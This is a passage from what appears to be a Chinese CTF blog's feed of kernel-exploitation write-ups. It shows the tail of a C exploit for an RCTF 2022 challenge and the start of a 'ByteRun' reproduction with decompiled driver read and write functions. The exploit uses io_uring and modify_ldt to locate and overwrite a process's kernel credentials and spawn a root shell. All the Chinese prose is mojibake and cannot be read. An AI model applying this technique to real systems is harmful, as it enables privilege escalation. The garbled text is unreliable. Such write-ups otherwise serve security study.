class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">        update_tag(&amp;ring, &amp;ldt, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!fork())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> res = syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x1000</span>);</span><br><span class="line">            <span class="keyword">if</span> (res != <span class="number">0x1000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;read_ldt failed!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            result = memmem(buf, <span class="number">0x1000</span>, target, <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">if</span> (result)</span><br><span class="line">            &#123;</span><br><span class="line">                cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x10</span>);</span><br><span class="line">                real_cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x18</span>);</span><br><span class="line">                <span class="keyword">if</span> ((real_cred &amp; <span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))</span><br><span class="line">                &#123;</span><br><span class="line">                    target_addr = search_addr + (i * <span class="number">0x1000</span>) + (result - buf);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] found task_struct : \033[0m %p\n&quot;</span>, target_addr);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] found cred : \033[0m %p\n&quot;</span>, real_cred);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    real_cred = <span class="number">-1</span>;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[-]\033[0m cannot rehint cred\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;real_cred, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;real_cred, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (real_cred != <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] write cred!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    desc.base_addr = <span class="number">0xff1000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x1000</span> / <span class="number">4</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    register_tag(&amp;ring1, buf, (<span class="number">0x1000</span> / <span class="number">8</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)buf = real_cred + <span class="number">4</span> + <span class="number">8</span> * i;</span><br><span class="line">        update_tag(&amp;ring, buf, <span class="number">1</span>);</span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)buf = <span class="number">0</span>;</span><br><span class="line">        read(fd, info, <span class="number">9</span>);</span><br><span class="line">        update_tag(&amp;ring1, buf, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)buf = search_addr + <span class="number">0x3000000</span>;</span><br><span class="line">    update_tag(&amp;ring, buf, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] write Done \033[0m&quot;</span>);</span><br><span class="line">    get_shell();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230420164729825.png"                      alt="image-20230420164729825"                ></p><hr><p>å‚è€ƒé“¾æ¥:</p><p>â€‹    <a class="link"   href="https://blog.rois.io/2022/rctf-2022-official-write-up/" >https://blog.rois.io/2022/rctf-2022-official-write-up/<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://elixir.bootlin.com/linux/v6.0.12/source" >https://elixir.bootlin.com/linux/v6.0.12/source<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://github.com/axboe/liburing/tree/d6527ac94c1bb2a2551b45899b23e8d256c3f896" >https://github.com/axboe/liburing/tree/d6527ac94c1bb2a2551b45899b23e8d256c3f896<i class="fas fa-external-link-alt"></i></a></p><p>é¢˜ç›®é“¾æ¥:</p><p>â€‹    XCTFä¸­å¯ä»¥ä¸‹è½½</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;ç›®å‰å„ç§æ¯”èµ›çš„å„ç§èµ›åˆ¶çœŸçš„æ˜¯è®©äººååˆ†éš¾å—ï¼Œä»¥è‡³äºæ„Ÿè§‰è‡ªå·±ä¸æ€ä¹ˆé€‚åˆæ‰“æ¯”èµ›äº†ã€‚æ‰€ä»¥æ‰“ç®—é™ä¸‹å¿ƒæ¥å¤ç°ä¸€åœºæ¯”èµ›ï¼Œåœ¨RCTFä¸­æ‰¾åˆ°åˆ†å€¼æœ€ä½çš„ä¸€é“é¢˜ã€‚</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="modify_ldt" scheme="https://cv196082.gitee.io/tags/modify-ldt/"/>
    
    <category term="io_uring" scheme="https://cv196082.gitee.io/tags/io-uring/"/>
    
  </entry>
  
  <entry>
    <title>ByteRunå¤ç°</title>
    <link href="https://cv196082.gitee.io/2023/04/01/ByteRun%E5%A4%8D%E7%8E%B0/"/>
    <id>https://cv196082.gitee.io/2023/04/01/ByteRun%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-04-01T07:05:48.000Z</published>
    <updated>2023-04-01T07:05:25.085Z</updated>
    
    <content type="html"><![CDATA[<p>å½“åˆçœ‹åˆ°å¢¨æ™šé¸¢å¤§ä½¬çš„åšå®¢å¯¹è¿™é“é¢˜ç›®çš„æè¿°çš„æ—¶å€™å°±å¯¹è¿™é“é¢˜æš—ç”Ÿæƒ…æ„«äº†ï¼Œå¦‚ä»Šç»ˆäºæ˜¯å¾—ä»¥å¤ç°ã€‚</p><h2 id="å†…æ ¸åˆ†æ"><a href="#å†…æ ¸åˆ†æ" class="headerlink" title="å†…æ ¸åˆ†æ"></a>å†…æ ¸åˆ†æ</h2><h3 id="å‡½æ•°åˆ†æ"><a href="#å‡½æ•°åˆ†æ" class="headerlink" title="å‡½æ•°åˆ†æ"></a>å‡½æ•°åˆ†æ</h3><p><del>è¿™é“é¢˜ç›®è¦è¯´éš¾ä¹Ÿç®—éš¾ï¼Œè¦è¯´ç®€å•é‚£å°±æ˜¯è¯´å±è¯</del>ã€‚è¿™é“é¢˜å¯ä»¥è¯´æ˜¯ä»é€†å‘å°±å¼€å§‹å˜å¾—ä¸å¯¹åŠ²èµ·æ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">bytedev_read</span><span class="params">(__int64 a1, __int64 user_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 a3; <span class="comment">// r14</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v6; <span class="comment">// eax</span></span><br><span class="line">  __int64 v7; <span class="comment">// r13</span></span><br><span class="line">  __int64 idx; <span class="comment">// rax</span></span><br><span class="line">  __int64 offset; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 *v10; <span class="comment">// r8</span></span><br><span class="line">  __int64 read_size; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 remaining_size; <span class="comment">// rbx</span></span><br><span class="line">  __int64 read_chunk_pos; <span class="comment">// r15</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  __int64 v15; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v16; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v17; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v18; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v19; <span class="comment">// eax</span></span><br><span class="line">  __int64 v20; <span class="comment">// rbx</span></span><br><span class="line">  _WORD *chunk; <span class="comment">// [rsp+10h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, user_buf);</span><br><span class="line">  a3 = v2;</span><br><span class="line">  v4 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  v5 = v4 + <span class="number">40</span>;</span><br><span class="line">  raw_spin_lock(v4 + <span class="number">40</span>);</span><br><span class="line">  v6 = __indword(*(_QWORD *)(v4 + <span class="number">0x20</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">    idx = *(<span class="keyword">int</span> *)(v7 + <span class="number">0xB0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)idx != *(_DWORD *)(v7 + <span class="number">0xB4</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      offset = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = *(<span class="keyword">unsigned</span> __int16 **)(v7 + <span class="number">8</span> * idx + <span class="number">0x30</span>);</span><br><span class="line">          read_size = v10[<span class="number">1</span>];</span><br><span class="line">          remaining_size = *v10 - (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read_size;</span><br><span class="line">          read_chunk_pos = (__int64)v10 + read_size + <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">if</span> ( remaining_size &gt; a3 )</span><br><span class="line">            remaining_size = a3;                <span class="comment">// current_read_size</span></span><br><span class="line">          <span class="keyword">if</span> ( (remaining_size &amp; <span class="number">0x80000000</span>) != <span class="number">0LL</span> )</span><br><span class="line">            BUG();</span><br><span class="line">          chunk = *(_WORD **)(v7 + <span class="number">8</span> * idx + <span class="number">0x30</span>);</span><br><span class="line">          _check_object_size((<span class="keyword">char</span> *)v10 + read_size + <span class="number">4</span>, remaining_size, <span class="number">1LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( copy_to_user(offset + user_buf, read_chunk_pos, remaining_size) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          a3 -= remaining_size;</span><br><span class="line">          offset += remaining_size;</span><br><span class="line">          v14 = (<span class="keyword">unsigned</span> __int16)(remaining_size + chunk[<span class="number">1</span>]);</span><br><span class="line">          chunk[<span class="number">1</span>] += remaining_size;</span><br><span class="line">          <span class="keyword">if</span> ( (_WORD)v14 == *chunk )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (_WORD)v14 != <span class="number">0xFFC</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">            kfree(chunk);</span><br><span class="line">            *(_DWORD *)(v7 + <span class="number">0xB0</span>) = (*(_DWORD *)(v7 + <span class="number">0xB0</span>) + <span class="number">1</span>) % <span class="number">0x10</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( a3 )</span><br><span class="line">          &#123;</span><br><span class="line">            idx = *(<span class="keyword">int</span> *)(v7 + <span class="number">0xB0</span>);</span><br><span class="line">            <span class="keyword">if</span> ( (_DWORD)idx != *(_DWORD *)(v7 + <span class="number">0xB4</span>) )</span><br><span class="line">              <span class="keyword">continue</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">        &#125;</span><br><span class="line">        printk(&amp;unk_F90);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_1038);</span><br><span class="line">LABEL_21:</span><br><span class="line">    raw_spin_unlock(v5);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v15 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  v16 = <span class="number">0x200</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x200</span> )</span><br><span class="line">    v16 = a3;</span><br><span class="line">  v17 = *(_QWORD *)(v15 + <span class="number">0x20</span>);</span><br><span class="line">  v18 = __indword(v17);</span><br><span class="line">  <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v19 = __indword(v17 + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v19 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = *(_QWORD *)(v15 + <span class="number">0x18</span>);</span><br><span class="line">      _check_object_size(v20, v16, <span class="number">1LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( copy_to_user(user_buf, v20, v16) )</span><br><span class="line">        printk(&amp;unk_1010);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_FF0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">  bytedev_read_cold_14();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨é©±åŠ¨çš„è¿™ä¸ªreadå‡½æ•°ä¸­è¢«åˆ†ä¸ºäº†ä¸¤å—ï¼Œåœ¨ä¸‹åŠéƒ¨åˆ†å¯ä»¥çœ‹åˆ°ä¸€ç›´ä½¿ç”¨çš„æ˜¯<code>__indword</code>å‡½æ•°ï¼Œè€Œè¿™ä¸ªæ˜¯å¯¹äºè®¾å¤‡çš„IOæ“ä½œï¼Œæ‰€ä»¥ä¸‹åŠéƒ¨åˆ†å°±æ˜¯å¯¹äºè®¾å¤‡çš„æ§åˆ¶ï¼Œä¸ŠåŠéƒ¨åˆ†åˆ™æ˜¯å¯¹äºå†…æ ¸ä¸­è‡ªèº«çš„æ“ä½œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">bytedev_write</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 a3; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v5; <span class="comment">// eax</span></span><br><span class="line">  __int64 v6; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// r9d</span></span><br><span class="line">  <span class="keyword">int</span> read_idx; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  __int64 v10; <span class="comment">// r15</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// edx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 remaining_size; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  _WORD *chunk; <span class="comment">// r13</span></span><br><span class="line">  __int64 user_buf; <span class="comment">// r12</span></span><br><span class="line">  __int64 write_offset; <span class="comment">// rax</span></span><br><span class="line">  __int64 v18; <span class="comment">// r13</span></span><br><span class="line">  _DWORD *v19; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v20; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v21; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v22; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v23; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v24; <span class="comment">// eax</span></span><br><span class="line">  __int64 v25; <span class="comment">// rbx</span></span><br><span class="line">  _WORD *v27; <span class="comment">// rax</span></span><br><span class="line">  _WORD *v28; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v30; <span class="comment">// [rsp+8h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v31; <span class="comment">// [rsp+8h] [rbp-40h]</span></span><br><span class="line">  __int64 v32; <span class="comment">// [rsp+10h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))_fentry__)();</span><br><span class="line">  a3 = v2;</span><br><span class="line">  v4 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  v32 = v4 + <span class="number">0x28</span>;</span><br><span class="line">  raw_spin_lock(v4 + <span class="number">0x28</span>);</span><br><span class="line">  v5 = __indword(*(_QWORD *)(v4 + <span class="number">0x20</span>));</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = <span class="number">0x200</span>LL;</span><br><span class="line">      v21 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">      <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x200</span> )</span><br><span class="line">        v20 = a3;</span><br><span class="line">      v22 = *(_QWORD *)(v21 + <span class="number">0x20</span>);</span><br><span class="line">      v10 = v20;</span><br><span class="line">      v23 = __indword(v22);</span><br><span class="line">      <span class="keyword">if</span> ( v23 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v24 = __indword(v22 + <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v24 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v25 = *(_QWORD *)(v21 + <span class="number">0x18</span>);</span><br><span class="line">          _check_object_size(v25, v20, <span class="number">0LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( copy_from_user(v25, a2, v10) )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = <span class="number">-14LL</span>;</span><br><span class="line">            printk(&amp;unk_1090);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v10 = <span class="number">-14LL</span>;</span><br><span class="line">          printk(&amp;unk_FF0);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v10 = <span class="number">-14LL</span>;</span><br><span class="line">        printk(&amp;unk_FC0);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">-14LL</span>;</span><br><span class="line">      printk(&amp;unk_1038);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">    idx = *(_DWORD *)(v6 + <span class="number">0xB4</span>);</span><br><span class="line">    read_idx = *(_DWORD *)(v6 + <span class="number">0xB0</span>);</span><br><span class="line">    v9 = idx + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (idx + <span class="number">1</span>) % <span class="number">16</span> != read_idx</span><br><span class="line">      || (v28 = *(_WORD **)(v6 + <span class="number">8LL</span> * idx + <span class="number">0x30</span>)) == <span class="number">0LL</span></span><br><span class="line">      || (v10 = <span class="number">-14LL</span>, *v28 &lt;= <span class="number">0xFFB</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v9 % <span class="number">16</span> == read_idx )</span><br><span class="line">          &#123;</span><br><span class="line">            v27 = *(_WORD **)(v6 + <span class="number">8LL</span> * idx + <span class="number">0x30</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v27 )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( *v27 &gt; <span class="number">0xFFB</span>u )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          chunk = *(_WORD **)(v6 + <span class="number">8LL</span> * ((idx + <span class="number">0xF</span>) % <span class="number">16</span>) + <span class="number">0x30</span>);</span><br><span class="line">          user_buf = a2 + v10;</span><br><span class="line">          <span class="keyword">if</span> ( chunk &amp;&amp; (write_offset = (<span class="keyword">unsigned</span> __int16)*chunk, (_WORD)write_offset != <span class="number">0xFFC</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = (<span class="keyword">unsigned</span> __int16)write_offset;</span><br><span class="line">            v12 = (__int64)chunk + write_offset + <span class="number">4</span>;</span><br><span class="line">            remaining_size = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">0xFFC</span> - v11);</span><br><span class="line">            <span class="keyword">if</span> ( remaining_size &gt; a3 )</span><br><span class="line">              remaining_size = a3;</span><br><span class="line">            <span class="keyword">if</span> ( (remaining_size &amp; <span class="number">0x80000000</span>) != <span class="number">0LL</span> )</span><br><span class="line">              BUG();</span><br><span class="line">            v30 = v12;</span><br><span class="line">            _check_object_size(v12, remaining_size, <span class="number">0LL</span>);</span><br><span class="line">            v14 = copy_from_user(v30, user_buf, remaining_size);</span><br><span class="line">            <span class="keyword">if</span> ( v14 )</span><br><span class="line">            &#123;</span><br><span class="line">              v10 = v14;</span><br><span class="line">              printk(&amp;unk_1060);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            